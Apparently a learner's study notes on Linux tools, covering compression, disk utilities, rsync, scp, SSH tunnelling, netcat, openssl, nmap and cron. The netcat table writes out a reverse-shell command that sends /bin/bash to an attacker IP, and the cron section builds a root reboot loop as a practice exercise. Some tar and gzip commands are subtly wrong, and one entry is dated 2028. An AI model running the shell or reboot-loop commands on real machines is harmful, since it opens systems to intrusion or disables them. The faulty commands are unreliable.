*June 07, 2026*


# **For unzipping**

## **Gunzip** 
----
*June 07, 2026*
*For gzip* — not for `.zip` or `.tar`

### **Usage for Decompressing**
```
gunzip filename.gz
```

>Commands and Flags

| Usage               | Desc                                                                                  |                                                                                |
| :------------------ | ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| `-d`                | explicitly state to decompress a file                                                 |                                                                                |
| `gunzip -k file.gz` | Keep the original `.gz` file                                                          |                                                                                |
| `gunzip -l file.gz` | Just view the info(without extracting)<br>`compressed size, uncompressed side, ratio` |                                                                                |
| `gunzip -f file.gz` | Force **Decompress**                                                                  |                                                                                |
| `gunzip -c file.gz` | Shows the content without extracting (just print)                                     | useful when saving the output to another file<br><br>`gzip -c [input] [output] |

### Usage for Compressing
```
gzip filename
```

>[!Note] NOT FOR FOLDERS
> A gzip is not for folders.
> -Its only for compressing a single file.
> - Compressing an entire dir for archive uses [[#**tar**]].


>Commands and Flags

|       Usage        | Desc                                 |
| :----------------: | ------------------------------------ |
| `gzip -k filename` | Compress but keeps the original file |
| `gzip -r folder/`  | Compress every file inside a folder  |
| `gzip -1 filename` | Compress fast (less squeez)          |
| `gzip -9 filename` | Compress hard(max squeez, slower)    |
| `gzip -v filemame` | Shows how much space you saved       |

#### REAL WORLD PRACTICAL USAGE

>**1.Compressing Log files**
```
-Use in /var/log
-Webservers(nginx,apache)
-System Logs
-Logrotate
```

>**2.Backup a single File & Can be used with tar**
```
#With tar
-tar -czvf archive.tar.gz myfolder/

-c Create an archive = “bundle files together first”
-f archive.tar.gz = Name of output file
-v Verbose (optional noise) = shows files being processed
-z THIS is the important one = after creating the tar archive, pass it through gzip

tar myfolder/ → archive.tar → gzip → archive.tar.gz

#single file
-gzip database.sql
```

>**3.Network Compression (HTTP,API's, etc.)**
```
Server Compress responses
HTML, JSON, CSS, JS

Example header:
Content-Encoding: gzip

Why?
- bandwidth is expensive
- CPU is cheap
- smaller payload = faster loading
```

## **bunzip2/bzip2**
---
*June 07, 2026*
*Slower then [[#**Gunzip**]] but compresses smaller.*
> Similarly — it also compress files and not directories

| Flags | Desc                             |                                                   |
| :---: | -------------------------------- | ------------------------------------------------- |
| `-d`  | Use in bzip2<br>`decompress`     | `bzip2 -d file`                                   |
| `-z`  | compress                         |                                                   |
| `-k`  | keeps the `.bz2` file            |                                                   |
| `-f`  | `Force overwrite`                | Overwrite the exisitng output file without asking |
| `-v`  | `verbose`                        | Shows compression progress                        |
| `-c`  | compress or decompress to stdout |                                                   |
|       |                                  |                                                   |

### Practical Usage

>**Decompressing**
```bash
# ORIGINAL FILE.BZ2 GETS DELETED
bunzip2 file.bz2    OR  bzip -d file.bzip2

#KEEPS THE BZ2 FILE
bunzip2 -k file.bz2 

#VIEW THE CONTENTS WITHOUT CREATING A FILE
bzcat file.txt
-it decompresses, prints to terminal, but does not create a file
```

>**Compression**
```bash
bzip2 -z file.txt
```
## **tar**
*June 07, 2026*
*— Tape Archive*  — Bundle files together. It creates a copy — Does not remove or modify original files.

>**Usage**
```
tar -[flags] [outputfile] [Folder_To_Compress]
```

>[!Note] It **does not compress**. It only packs files together  while preserving the 
>```
>-Directory Structure
>-File Permission
>-Ownsership
>-Timestamp
>-Symbolic Links
>```

| Flags | Desc                                    |                                                                                    |
| :---: | --------------------------------------- | ---------------------------------------------------------------------------------- |
| `-c`  | Create new archive                      |                                                                                    |
| `-x`  | Extract                                 |                                                                                    |
| `-t`  | List archive content without extracting |                                                                                    |
| `-v`  | Verbose (shows the progress)            |                                                                                    |
| `-f`  | Indicate a filename output              |                                                                                    |
| `-z`  | Use gzip for compression                | Other options for compression are:<br>`-j` — for bzip2<br>`-J` — for xz<br>`-`<br> |


### Practical Usage

>**1. Creating an Archive**
```bash
tar -cvf output.tar thisFolder/
```

>**2. Using Compression**
```bash
#For GZIP
tar -cvfz output.tar.gz ThisFolder/

#For bzip2
tar -cvfj output.tar.bz2 ThisFolder/

#For xz 
tar -cvfJ output.tar.xz ThisFolder/
```

>**3. Extracting Archives**
```bash
tar -xvf arhivedFile.tar

#FOR SPECIFIC DIRECTORY
tar -xvf archivedFile.tar -C /path/to/destination/

#LIST FILES INSIDE WITHOUT EXTRACTING
tar -tvf archivedFile.tar

#WORKS WITH COMPRESSED FILE TOo
tar -tvfz archivedFile.tar.gz
```

>**4. Extract a compressed archive**
```bash
#For GZIP
tar -xvfz archivedFile.tar.gz

#For BZIP2
tar -xvfj archivedFile.tar.bz2

#For xz
tar -xvfJ archivedFile.tar.xz
```







# **FOR DISK-RELATED TOOLS**

### fdisk 
---
*Similar to [[#parted]] but this one saves changes to memory until write*
### parted
---
*Used to `create`, `destroy`, `resize`, `check`, and `copy` hard disk partitions*
Requires `sudo`

>**Usage**
```Usage
sudo parted -l
```
Useful when exploring about the [[Linux_File_System__Major_Only_#The Anatomy of Disk|The Anatomy of Disk]]

| flags                                     | desc                                        |                                                               |
| :---------------------------------------- | ------------------------------------------- | ------------------------------------------------------------- |
| `-l`                                      | List partitions layout on all block devices |                                                               |
|                                           |                                             |                                                               |
| **MANAGING PARTITIONS**                   | **MANAGING PARTITIONS**                     | **MANAGING PARTITIONS**                                       |
| `sudo parted /dev/sdb1 resizepart 1 1GiB` |                                             |                                                               |
| `sudo parted /dev/sdb1 rm 1`              | Permanently deletes a paratition            |                                                               |
| `print`                                   | print the partitions                        |                                                               |
| `print free`                              | Print the free space                        | Use by admin before creating partitions to avoid manual math. |
|                                           |                                             |                                                               |
### mkpart
---
*CLI tool inside the [[#parted]] to create disk partitions*

>Usage
```Bash
mkpart [name] [file_system] [startingPoint] [endPoint]
```

>Example:
```Bash
# Assume the disk is 2GB, And only want 50% of it. 
mkpart primaryPart ext4 1MiB 50%
```

>[!Important] Mount the partition and Persist before reboot
>[[Documentations#Step3 Create a mount point & Mount It|How to mount]]
>[[Documentations#Step5 Make it persist|How persist before reboot]]

### mkswap
---
*June 16,2026*
*Used to format a partition into file used as swap*
*[[Linux_File_System__Major_Only_#Swap|Read here about swap]]* 

*Use to initialize a partition or file as a swap area.*
```Bash
sudo mkswap /dev/sdb
```

### fsck
---
*June 17,2026*
*File system check* — tool to inspect a filesystem for errors and fixes them
```Bash
sudo fsck /dev/sdb3
```

*File system consistency check*
It checks and repairs filesystem structure issues like:
```
- corrupted metadata
- broken inode references
- orphaned files
- invalid directory links
- journal inconsistencies (ext3/ext4)
```

 **What it actually checks**
`fsck` mainly verifies consistency between:
```
- inodes → do they point to valid data blocks?
- directories → do file names match real inodes?
- free block map → are blocks correctly marked used/free?
- superblock → is filesystem metadata sane?
```

| Flags     | Desc                             |                                                               |
| :-------- | -------------------------------- | ------------------------------------------------------------- |
| `-f`      | Force check                      | even if fs looks clean — normally skips diskls that seem fine |
| `-y`      | Auto 'yes' to all repair prompts | good for unattended scripts                                   |
| `-n`      | Auto 'no'                        | For just reporting problem, dont fix                          |
| `-C`      | Show progress bar                | Useful for large disks where the check takes a while          |
| `-A`      | Check ALL fs listed /etc/fstab   |                                                               |
| `-t ext4` | Specify a filesystem types       |                                                               |
>[!Danger] Critical Rule
> Never run fsck on a **mounted partition** — especially not the root filesystem while its in use. 
> 
> - It can cause data corruption, since fsck might fix things that are mid-write.
> - Unmount first or use a live boot/rescue mode for the root partition.

>[!Important]- Repairing the root `/` partition — special case
>1.Boot from a live USB/rescue disk — root isnt mounted from there so you can run fsck freely.
>2.Or Schedule a check for the next reboot: 
>```Bash
>sudo touch /forcefsck
>```
>then reboot — many distros will run fsck on root before mounting it

>[!Note] When fsck finds orphaned data
>If fsck finds data blocks that don't belong to any file (no inode points to them), it doesn't delete them — it recovers them into a special folder:
>
/lost+found/
>
Files here usually lose their original names (since the naming info was in the broken link), but the content is preserved. Worth checking after a major recovery.


# **File Transfer Tools**

### **RYSNC**
---
*Synchornization tool, not just copying*

>[!Note] Usage
>```Bash
>rsync [options] sources destination
>
>#example
>rsync -avz file.txt user@server:/source/  /destination/
>```

**With SSH**
```bash
rysync -avz --progress -e "ssh -p [portNum]" username@ipaddress:[source] [destinationToLocalMachine] 
```


>[!Question] **QUESTIONS**
>**What does it do?**
>- Compare sources vs destination
>- Transfer only differences
>	- meaning first sync is full transfer, the next time sync is only the changes.
>- Can resume interrupted transfers
>- Can preserve permissions, timestamps, ownership, etc.
>
>**Can it detects changes in slight modification in file and syncs it?**
>*Yes, it checks metadata, like modification time. It skips the size same, mtime same*
>
>**Can it be use for compressed files or dir?**
>*It does not sync whats inside the compressed file. It treats the compressed file as a single file. Technically, the answer is **yesnt** *

**The difference of sync to Copy**

| Tool  | Behavior           |
| :---- | ------------------ |
| `cp`  | Blindly copies     |
| scp   | secure remote copy |
| rsync | intelligent sync   |

**Commands**

| Commands                             | Desc                                                                   |                                                                                                                                                                                                                               |
| :----------------------------------- | ---------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `rsync -av sources/ dest/`           | `a` - archive mode <br>`v` - verbose mode, it displays whats happening | commonly use                                                                                                                                                                                                                  |
| `-c`                                 | -checksum                                                              |                                                                                                                                                                                                                               |
| `--delete`                           | delets files in destination that doesnt exist in source                |                                                                                                                                                                                                                               |
|                                      |                                                                        |                                                                                                                                                                                                                               |
| ***RSYNC OVER SSH***                 | ***RSYNC OVER SSH***                                                   | ***RSYNC OVER SSH***                                                                                                                                                                                                          |
| `rsync -av source/ user@ip:/path/`   | copy `source/` to remote machine via ssh                               | The source is client                                                                                                                                                                                                          |
| `rsync -av user@ip:/path/ localDest` | the source destination is from server. Copy to client machine          | The source is server                                                                                                                                                                                                          |
|                                      |                                                                        |                                                                                                                                                                                                                               |
| ***COMMON FLAGS***                   | ***COMMON FLAGS***                                                     | ***COMMON FLAGS***                                                                                                                                                                                                            |
| `-a`                                 | archive mode.                                                          | the baseline. Its like a bundle of flags<br><br>`-r` recursive<br>`-l` preserve symlinks<br>`-p` preserve permissions<br>`-t` preserve timestamp<br>`-g` preserve group<br>`-o` preserver owner<br>`-D` preserve device files |
| `-v`                                 | verbose. Shows whats happenig                                          | useful for bebugging<br>useless in automation                                                                                                                                                                                 |
| `--progress`                         | shows per-file transfer progress                                       | useful for large file<br>slows output slightly                                                                                                                                                                                |
| `-z`                                 | compression. Compress data during transfer.                            | FOR NETWORK/SSH ONLY<br>useful for slow internet<br>useless for local copy.<br><br>TRADEOFF??<br>save bandwith<br>uses CPU                                                                                                    |
| `--delete`                           | makes destination mirror the source exactly                            | if file is removed in source. It also removed in dest.                                                                                                                                                                        |
| `-c`                                 | checksum mode. Compares actual file content(not just metadata)         | very accurate, but super slow.<br>use only when timestamp is unreliable and high integrity is must                                                                                                                            |
|                                      |                                                                        |                                                                                                                                                                                                                               |

### SCP 
----
*June 27, 2028*
*Secure Copy — used to copy files between machines over SSH*

>Usage and Pattern:  `cp` + `ssh` = `scp`  
```
scp [flags] <source> <destination>
```

#### **Copy LOCAL to REMOTE**
```bash
scp [flags and options] [the_File] <user>@<remoteIP>:[dest_Path/]
```

#### **Copy REMOTE to LOCAL**
```bash
scp [flags and options] <user>@<remoteIP>:[source_Path] [dest_path]
```

| Flags | Desc                                                                            |                                   |
| :---- | ------------------------------------------------------------------------------- | --------------------------------- |
| `-P`  | Specify a port number for the SSH server                                        | `scp -P 2222 [the_File].....`     |
| `-i`  | Explicitly provide the `identity file`/`private_key` for SSH key authentication | `scp -P 2222 i ~/.ssh/[filename]` |
| `-r`  | Recurisve — for copying folders and its contents                                | `scp -P 2222 -r`                  |
| `-v`  | Verbose — for debug transfer                                                    | `scp -P 2222 -rv`                 |
| `-C`  | Compression — speed up transfer over slow network                               | `scp -P 2222 -Crv`                |


---
---

# **Networking** 

### SSH (Secure Shell)
---
Reference how to setup : [[SSH_Setup]]
*a powerful tool and network protocol 
- A `protocol` in a way that It determines how two computers communicate securely:
	- Encryption: It uses rules for hashing and encryption (such as AES) to scramble data so it cant read in transit
	- Authentication: It defines the secure exchange of cryptographic keys and passwords to verify identity.
	- **Layering:** It divides tasks into sub-protocols: a transport layer, a user authentication layer, and a connection layer.
- A `Tool` in a way as the Implementation of rules in protocol.

- Used by developers and IT administrators to securely access, control, and transfer files between computers over an unsecured network. It acts like an encrypted tunnel, allowing you to execute commands on a remote server as if you were sitting right in front of it*

#### Utilities
---
- Remote Admin - To run terminal commands on servers across the world
- File Transfer - Use with tools like [[#SCP]] or SFTP 
- Port Forwarding - Create a secure tunnel to safely route other network traffic or bypass restrictive firewalls.

---

#### **How to File Transfer using SCP**
---
Read more here : [[#SCP]]

---
#### **How to use rsync over SSH**
---
Read more here: [[#**RYSNC**]]

---
#### **How to Local Port Forwarding**
---
*Use this when you want to access a web UI of a certain service running only locally*

Use the `-L` flag.
```bash
ssh -L [CLIENTportToUse]:[DESTINATION_HOST/IP]:[DESTINATION_PORT] user@host
ssh -L 8080:192.168.1.x:81 user@host
```

Breakdown:
```c

-L means local port forwarding/ Listening port

The first 8080        - is the port on your local machine.
192.168.1.50:81       - is the target inside the SSH server’s LAN.
user@your-ssh-server  - is your SSH login.
```

Then you can now access the Web UI via browser:
```
http/localhost:[Client_Port_Used]
```

Reminder:
```
The [CLIENTportToUse] doesnt have to match the target port dest.
```


Basic Flow:
```
You
 |
 | ssh -L ...
 |
 v
SSH Client
 |
 | SSH Client NOW Listening on localhost:8080
 |
SSH Tunnel Established
```
Nothing has gone through the tunnel yet.
But when you opened a browser:
```
Browser
 |
 | http://localhost:8080
 |
 v
SSH Client
 |
 | "Ah! Someone connected to my local port."
 |
 | Encrypt
 |
 v
SSH Server
 |
 | Connect to 192.168.1.20:81
 |
 v
NPM
```

---
#### **How to Dynamic Port Forwarding**
---
*If flag `-L` is use for local service one at a time. This one do it dynamic, not needing to re-logout then use another port for another service.*

With the use of `-D` Flag:
```bash
ssh -D [Client_Port_to_Use] user@host/IP

#Example
ssh -D 1080 username@myserver.ssh
```
This creates a [[PROXY#SOCKS PROXY (SOCK4 & SOCKS5)|SOCKS]] proxy on the client machine. Let it be the one forward the request to the server.


You can test it without browser first. Follow the syntax in another terminal tab.
```bash
curl --socks5 localhost:[Port_Used_byu_Client] http://host/ip:[port]
```

Reminder:
```
Remember: To setup a proxy in browser when testing it.
There is no flag that explicitly states what SOCKS proxy to use to forward request to sshd.
The -D flag is default to use the localhost. 
```


Basic flow:
```
Your PC
 |
 | SOCKS proxy
 |
SSH
 |
 +---- NPM:81
 |
 +---- Grafana:3000
 |
 +---- NAS:5000
 |
 +---- Anything reachable
```

#### How to use specific identity file
---
Syntax: Using the `-i` flag
```Bash
ssh -i [location/filename] user@host/ip
```


---


---

### Netcat (nc)
*June 27, 2026*
*The Swiss Army Knife of Networking 
- a low-level networking tool that can **read and write data across TCP/UDP connections**.*
- a user-space application that directly uses the OS socket API to create TCP/UDP connections.
- A CLI interface that wraps [[RANDOM FOR NOW#SOCKETS|socket]] system calls 
- *Manual connection between two network endpoints using raw data stream*


>Think of it as a **network pipe** tool. And because it directly uses socket API:
>- it connects two machines
>- **Sends raw data** between them
>- **Doesnt care** about format (HTTP, files, text, etc.) 
>	- *Check this out to know what it means: [[How_host_do_speaks_on_the_internet#Layer Placement for Real world]]*

#### How is it used?

>Basic Syntax
```bash
nc [options] <host> <destination_port>    #client mode
nc -l <port>                              #listener mode
```

#### How it works

>It uses:
- TCP or UPD sockets
- Raw byte stream ( no application protocol required)
>So instead of:
```
Browser --> HTTP ---> Remote port
```
It uses:
```
You --> RAW SOCKET --> Remote port
```

#### What is it used for?

| Category          | Use Case                                            |                                                                                                  |                                                                                                                                                                                                                                               |
| :---------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Debugging         | Test if a port is open, Inspect raw server response | `nc -zv google.com 443`<br><br>`-z` zero I/O scan only<br>`-v` verbose                           |                                                                                                                                                                                                                                               |
| Port Scanning     | Lightweight scan to check open ports                | `nc -zv <ip> 20-80`<br>form port 20 to port 80                                                   |                                                                                                                                                                                                                                               |
| Port Listening    | server-side. *Uses the loopback ip as default*      | `nc -l 4444`                                                                                     |                                                                                                                                                                                                                                               |
| Port Listening    | Explicitly state the server's ip                    | `nc -l <ipadress> <port>`                                                                        |                                                                                                                                                                                                                                               |
| Banner Grabbing   | Identify what service is running on a port          | `echo "" \| nc -v exmaple.com 80`                                                                |                                                                                                                                                                                                                                               |
| File Transfer     | Sends files between machines without scp/ftp        | Receiver:  `nc -l 9000 > received_file.tar.gz`<br>Sender:   `nc 192.168.1.10 9000 < file.tar.gz` | TIP: the `>  <` is also use for redirection of text when doing real time chat<br>`nc -lv 4444 > to_this_file`  <br>`nc <ip> <port> > to this file`<br><br>now both text for client and server are redirected to their respective file choice. |
| Chat              | Primitive real-time chata over a LAN                | Machine A:  `nc -l 5000`<br>Machine B: `nc 192.168.1.10 5000`                                    | Example: Piping <br>`echo "message" \| nc -l <port><br>                                                                                                                                                                                       |
| Proxying          | Real traffic between hosts                          |                                                                                                  |                                                                                                                                                                                                                                               |
| Shell Access      | Bind or Reverse shell (used heavily in pentesting)  | Attacker:  `nc -l -p 4444`<br>Victim:  `<attackerIP> 4444 -e /bin/bash`                          |                                                                                                                                                                                                                                               |
| Server Simulation | Stand up quikc listener to test client behavior     |                                                                                                  |                                                                                                                                                                                                                                               |
>[!Important] Firewall
>Dont forget to enable the port that will be used to listen. Or else, clients may not get through.

> Common flags

| Flags | Desc                                        |                                           |
| :---- | ------------------------------------------- | ----------------------------------------- |
| `-l`  | listen mode                                 |                                           |
| `-p`  | state the port to use as a client           | `local source port` — where you send from |
| `-v`  | verbose                                     |                                           |
| `-z`  | Scan mode ( no data sent)                   |                                           |
| `-u`  | UDP mode                                    |                                           |
| `-e`  | execute program (dangerous, often disabled) |                                           |
| `-k`  | keeo the connection active                  | (used together with `-l` flag)            |


### openssl
---
July 03, 2026
*A cryptography toolkit that implements the protocol of SSL(Secure Socket Layer) and TLS(Transport Layer Secure)

>**Practical usage list** 
- Encryption and decryption
- Generating hashes
- Creating SSL/TLS certificates
- Creating public/private keys
- Inspecting certificates
- Testing TLS connections
- Generating random numbers

>**It is used everywhere:**
- HTTPS websites
- SSH (indirectly, for key formats and cryptography)
- VPNs
- Email encryption
- Web servers
- Certificate Authorities

#### Most useful subcommands

| Subcommand | Purpose                                            |                                                                                                                                |                                                                     |
| :--------: | -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------- |
| `version`  | Show the ver                                       | `openssl version`                                                                                                              |                                                                     |
|   `rand`   | Generate random bytes                              | `openssl rand 16`<br>`openssl rand -hex 16`<br>                                                                                | *for API keys, passwd, tokens, salts*                               |
|   `dgst`   | Create hashes/checksum                             | `openssl dgst -sha256 [file]`                                                                                                  |                                                                     |
|   `enc`    | Encrypt or decryp files<br><br><br>To decrypt:     | `openssl enc -aes-256-cbc -in secrete.txt -out secret.enc`<br><br>`openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt` |                                                                     |
| `genrsasa` | Generate RSA Private key <br>*`genpykey` is newer* |                                                                                                                                |                                                                     |
| `genpkey`  | Generate private keys                              | `openssl genpkey -algorithm RSA -out private.pem`                                                                              |                                                                     |
|   `rsa`    | Inspect RSA Keys                                   |                                                                                                                                |                                                                     |
|   `req`    | Create Certificate Signing Request (CSR)           |                                                                                                                                |                                                                     |
|   `x509`   | Work with certificate                              | `openssl x509 -in certificate.crt -text -noout`                                                                                | Shows:<br><br>- issuer<br>- subject<br>- expiration<br>- public key |
| `s_client` | Test SSL/TLS connection                            | `openssl s_client -connect example.com:443`                                                                                    |                                                                     |
|            |                                                    |                                                                                                                                |                                                                     |
|            |                                                    |                                                                                                                                |                                                                     |


#### Interactive Mode
---
An *interactive mode* means :
- You start the program once, and it stays running,
- Waiting for commands or input from you.
- Read [[Feynman-Technique#Interactive Mode Commands]]

Some OpenSSL subcommands are interactive. For example:
```bash
openssl s_client -connect example.com:443
```


---


### nmap
---
July 03, 2026
*Network Mapper* - A network scanner
Part of `Reconnaisance` Tool

>**It can discover**:
- Hosts on a network
- Open ports
- Running services
- Operating systems (best effort)
- Software versions
- Firewall behavior
- Network topology (to some extent)

#### Usage
```bash
namp [options] target
```

| Practical use                       | Command                                                |               |     |
| :---------------------------------- | ------------------------------------------------------ | ------------- | --- |
| Basic scan                          | `nmap [ipaddress/hostName]`                            |               |     |
| Scan entire subnet                  | `nmap [ip/24]`                                         |               |     |
| Check  port                         | `nmap -p 80 [target]`<br>`nmap -p 80-100 [target]`<br> |               |     |
| Check for what services are running | `nmap -sV [target]`                                    |               |     |
| Guess the operating System          | `nmap -O [target]`                                     | Requires root |     |

|  Common Scan Types  | Commands |                              |
| :-----------------: | -------- | ---------------------------- |
| Host discovery only | `-sn`    |                              |
| SYN(Half-open)scan  | `-sS`    | Refer to [[3-WAY_HANDSHAKE]] |
|  TCP Connect Scan   | `-sT`    |                              |
|      UDP Scan       | `-sU`    |                              |
|   Aggressive Scan   | `-A`     |                              |

---

### wireshark
---
*July 11, 2026*
A tool used to for packet analysis.

**Capabilities:** *Network Troubleshooting, Security Analysis, Protocol Analysis, Deep Filtering*

---

# **Time Scheduler**
---

## **Cron**
---
*August 11, 2026*
A  built-in mechanism in Linux to run commands or scripts automatically on specified time or interval.
- Its like Task Scheduler of Windows

In simple term:
>"When this specific time comes, run this command"

#### **How it works in abstract architecture**
---
```
              CRON SYSTEM
                   │
        ┌──────────┴──────────┐
        ▼                     ▼
   Cron daemon             Crontab
   "Secretary"            "Schedule"
        │                     │
        │◄── reads/checks ────┘
        │
        ▼
   "It's time."
        │
        ▼
   Execute command
```

**There are two parts**
1. `cron` daemon (`crond`) – The `secretary` or `scheduler`
	- Continuously running in the background
	- It always checks the schedule
	- **EXECUTES** the appropriate command to run a certain script when due
2. `Crontab` 
	- Schedule / instruction sheet
	- Contains `WHAT` to run
	- Contains `WHEN` to run it

---
#### **The problem it solves**
---

It solves the repetitive tasks such as:
- Backup files every day or week or month
- Cleanup temp files every day or week or month
- Log maintenance everytime
- Database dump 

----

####  **Three places to store cron schedules**
---
1. `crontab -e`
	- For each user
	- No `user` field entry 
2. `/etc/crontab`
	- System wide, single file
	- It has `user` field to know who runs the command
	- Usually requires root/sudo privileges
3. `/etc/cron.d/*`
	- System-wide
	- Contains mini `crontab files` 
	- Inside those `crontab files` may include one or more cronjob entries

---

#### **Reading its format**
---
Reference:
```c
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit23

#====OUTPUT=====
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

**Crontab entry (System-wide)**
```
[schedule] [user] [command]
```

>**Line 1**
```c
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```
- `@reboot` – A special shortcut. Every time theres a reboot or restart.
- `bandit23` – the `user` who will run the command. 
- `/usr/bin/cronjob_bandit23.sh` - the script file that will be run.
- `&> /dev/null` – A redirection all [[Whatis#3. stderr(Standard Error)|stderr]]

>*"Every time that the machine restarts, run the scrip as user bandit23 and show no output"*

>**Line2**
```
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
  
*     *     *     *     *
│     │     │     │     │
│     │     │     │     └─ Day of week       (Mon—Sun, valued 0-7)
│     │     │     └─────── Month             1-12 or jan-dec
│     │     └───────────── Day of month      1-31
│     └─────────────────── Hour      0-23
└───────────────────────── Minute    0-59
```
"If they are all asterisk `*` . It means every minute"
>"*Every minute. Execute the `/usr/bin/cronjob_bandit23.sh` as user `bandit23` *"

>**Common shortcuts**
- `@hourly` — `0 * * * *`
- `@daily` —  `0 0 * * *`
- `@weekly` — `0 0 * * 0` (0-7)  
- `@monthly` — `0 0 1 * *`
- `@yearly` — `0 0 1 1 *`  

##### Environment path:
----
```
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
The line above i written at `/etc/crontab`.  It is commented intentionally because, the default is already sufficient for normal system commands

****
### **How to cron**
---
#### **How to edit, list, and remove crontab**
---
>**Edit the current users crontab**
```
crontab -e
```
Then, for test:
```
* * * * * echo "Hello World" >> /tmp/temporarycron.txt
```

>**To view/list crontab:**
```
crontab -l
```

It doesn't directly edit the actual installed crontab while editing. 
Conceptually:
```
crontab -e
     │
     ▼
Temporary editing copy at  /tmp/crontab.IoeFVc/crontab     
     │
     │ user performs edit
     ▼
   Save/Exit
     │
     ▼
cron validates/installs it
     │
     ▼
User's crontab updated
```
Once save and exit. Only then the crontab utility will update the new crontab and save it inside the [[Linux_File_System__Major_Only_#/var/spool|/var/spool directory]]

>**To remove crontab**
```
crontab -r
```
Note: This removes the entire cronjobs in a crontab. 
To remove certain crobjob, first do `crontab -e` then remove the entry.

---
#### **How to use system-wide crontab**
---
*Requires sudo*
The `/etc/crontab` is simplest 
```
sudo nano /etc/crontab
```
Then do edit:
```
* * * * * yourusername echo "system cron" >> /tmp/system-cron.txt
```

---
#### **How to view CRON logs**
---
Debian/Ubuntui systems
```
grep -i cron /var/log/syslog
```
---
#### **How to Capture Job Output and Errors**
---
*Read first about : [[Whatis#STDOUT, STDIN, STDERR]] for better understanding about redirections.*

Because default system logs only note execution events, you must explicitly redirect a job's output within your crontab configuration to debug failures.

**Append the output to a file**
```
* * * * * <user> command >> /var/log/my_cronjob.log 2>&1
```

**Overwrite the log file every run**
```
* * * * * <user> command > /var/log/my_cronjob.log 2>&1
```
---

#### **How to reboot loop a machine using cron**
---
*Requires sudo access*
*The purpose of this setup is to learn to fix it*

Edit a crontab at `/etc/`
```
sudo nano /etc/cron.d/reboot_loop
@reboot root reboot 
```

*Note:* This wont wont with regular user, becuase, the reboot command for regular users requires ***interactive authentication context*** via `polkit/systemd-logind` in which case a cron doesnt have.